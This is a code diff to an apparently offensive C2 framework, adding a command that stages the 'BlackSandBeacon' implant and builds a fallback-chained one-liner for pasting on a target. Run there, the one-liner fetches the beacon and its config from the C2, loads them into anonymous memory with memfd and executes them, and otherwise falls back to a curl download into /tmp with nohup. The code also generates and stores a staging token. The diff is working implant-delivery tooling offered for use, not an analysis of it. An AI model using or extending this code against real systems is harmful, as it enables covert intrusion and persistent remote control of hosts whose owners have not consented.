@@ -193,10 +193,11 @@ class BofMarketplaceCommandSet(LazyOwnCommandSet):
 
         Usage: bof_run <bof_name> <beacon_client_id> [arg1,arg2,...] [--wait <sec>]
 
-        Stages the BOF, then queues a ``bof:<c2_url>/download/bofs/<name>
+        Stages the BOF, then queues a ``bof:<c2_url>/bof/<name>
         <args>`` command on the C2 for the specified beacon. The beacon
-        downloads the object over the malleable channel and executes it
-        in-process (COFFLoader on Windows, RunELF loader on BlackSandBeacon).
+        downloads the raw base64 object over the malleable channel and
+        executes it in-process (COFFLoader on Windows, RunELF loader on
+        BlackSandBeacon).
 
         Examples:
             bof_run whoami_linux linux_beacon_01 --wait 20
@@ -494,6 +495,162 @@ class BofMarketplaceCommandSet(LazyOwnCommandSet):
             print_msg(
                 f"  {YELLOW}{entry.name}{RESET} [{entry.platform.value}] [{entry.client or '-'}] [{entry.category.value}]"
             )
+
+    def _ensure_stage_token(self) -> str:
+        """Return the payload staging token, generating one when absent.
+
+        The token gates the fileless ``/stage/`` delivery channel; without
+        it the upstream stager cannot authenticate against the C2. A fresh
+        random token is generated and persisted through the sanctioned
+        assign path the first time this command runs.
+
+        Returns:
+            The live staging token (empty when generation was refused).
+        """
+        token = str(self.params.get("stage_token", "") or "").strip()
+        if token:
+            return token
+        import secrets
+
+        token = secrets.token_hex(16)
+        self.do_assign(f"stage_token {token}")
+        assigned = str(self.params.get("stage_token", "") or "").strip()
+        if assigned != token:
+            print_error("stage_token could not be persisted — set it manually: assign stage_token <hex>")
+            return ""
+        print_succ("stage_token generated and persisted (rotates per engagement with: assign stage_token <hex>)")
+        return token
+
+    def _ensure_beacon_staged(self) -> bool:
+        """Stage the blacksandbeacon client when the /s/ copy is missing.
+
+        Fast path: the addon staging copy is fresher than (or equal to)
+        the deploy-staged one, so only the runtime config is re-aligned
+        and the fresh binary is re-copied over the served name. Slow
+        path: the full addon build (git pull + make) runs through the
+        delivery service. A stale sessions/blacksandbeacon from an old
+        session must never survive: it speaks an older wire protocol and
+        the fileless beacon would decrypt garbage commands.
+
+        Returns:
+            True when sessions/blacksandbeacon + config exist afterwards.
+        """
+        from pathlib import Path
+
+        from core.config import load_payload
+
+        staged = Path("sessions/blacksandbeacon")
+        fresh = Path("sessions/temp_uploads/blacksandbeacon")
+        try:
+            staged_time = staged.stat().st_mtime if staged.is_file() else -1.0
+            fresh_time = fresh.stat().st_mtime if fresh.is_file() else -1.0
+        except OSError:
+            staged_time, fresh_time = -1.0, -1.0
+        if fresh.is_file() and (not staged.is_file() or fresh_time >= staged_time):
+            try:
+                import shutil
+
+                shutil.copy2(fresh, staged)
+                from modules.bof_delivery import (
+                    BofDeliveryConfig,
+                    load_client_addon,
+                    write_client_config,
+                )
+
+                data = load_payload()
+                client_id = str(data.get("beacon_client_id", "") or "linux_beacon").strip() or "linux_beacon"
+                addon = load_client_addon("blacksandbeacon")
+                write_client_config(addon.name, client_id, BofDeliveryConfig(), data)
+                from modules.bof_delivery import _raw_stage_for_implant_serving
+
+                _raw_stage_for_implant_serving("blacksandbeacon", staged, BofDeliveryConfig())
+                return True
+            except Exception as exc:
+                print_error(f"config alignment failed ({exc}); falling back to a full stage")
+        try:
+            from modules.bof_delivery import stage_client
+
+            stage_client("blacksandbeacon")
+            return Path("sessions/blacksandbeacon").is_file()
+        except Exception as exc:
+            print_error(f"client staging failed: {exc}")
+            return False
+
+    def _build_fileless_oneliner(self, stage_token: str) -> str:
+        """Build the fallback-chained fileless delivery one-liner.
+
+        Chain (stops at the first success; the memfd stagers fork and the
+        parent exits 0 when the beacon is running):
+
+        1. Upstream diskless stager (token-gated /stage/ endpoints).
+        2. Raw /s/ memfd stager (no token needed).
+        3. Disk bootstrap (curl to /tmp + nohup).
+
+        Args:
+            stage_token: Staging token for the /stage/ channel.
+
+        Returns:
+            The shell one-liner to paste on the target.
+        """
+        from modules.bof_delivery import (
+            _FILELESS_STAGE_TEMPLATES,
+            _FILELESS_STAGER_B64,
+            _stage_payload_b64,
+        )
+
+        lhost = str(self.params.get("lhost", "127.0.0.1") or "127.0.0.1")
+        c2_port = str(self.params.get("c2_port", "4444") or "4444")
+        stage_payload_b64 = _stage_payload_b64() or ""
+        pieces: list[str] = []
+        for template in _FILELESS_STAGE_TEMPLATES:
+            if "stage_payload_b64" in template and not stage_payload_b64:
+                continue
+            line = template.format(
+                lhost=lhost,
+                c2_port=c2_port,
+                target_path="/tmp/.svc",
+                config_path="/tmp/config.json",
+                binary_name="blacksandbeacon",
+                config_name="blacksandbeacon_config",
+                stager_b64=_FILELESS_STAGER_B64,
+                stage_payload_b64=stage_payload_b64,
+                stage_token=stage_token,
+            )
+            pieces.append(f"( {line} )")
+        return " || ".join(pieces)
+
+    @cmd2.with_category(command_and_control_category)
+    def do_bsb_stage(self, line: str):
+        """Stage the fileless BlackSandBeacon and print its delivery one-liner.
+
+        Usage: bsb_stage
+
+        Aligns the staged beacon runtime config with the LazyOwn C2
+        (poll/report URIs, master key from sessions/key.aes), generates a
+        staging token on first use, and copies the fallback-chained
+        fileless one-liner to the clipboard:
+
+            upstream /stage/ stager || raw /s/ memfd stager || disk curl
+
+        Paste it on the target: it fetches the ELF + config over HTTPS,
+        memfd_creates both and execve's the beacon from anonymous memory
+        (nothing is written to disk). Requires lhost/c2_port in
+        payload.json and the C2 running.
+        """
+        stage_token = self._ensure_stage_token()
+        if not stage_token:
+            return
+        if not self._ensure_beacon_staged():
+            return
+        oneliner = self._build_fileless_oneliner(stage_token)
+        if not oneliner:
+            print_error("no delivery fallback could be built")
+            return
+        from utils import copy2clip
+
+        copy2clip(oneliner)
+        print_succ(f"{GREEN}fileless one-liner ready (upstream stage || raw /s/ || disk fallback){RESET}")
+        print_msg("queue commands with issue_command_to_c2; run BOFs with bof_run <name> <beacon_id>")
 
 
 __all__ = ["BofMarketplaceCommandSet"]
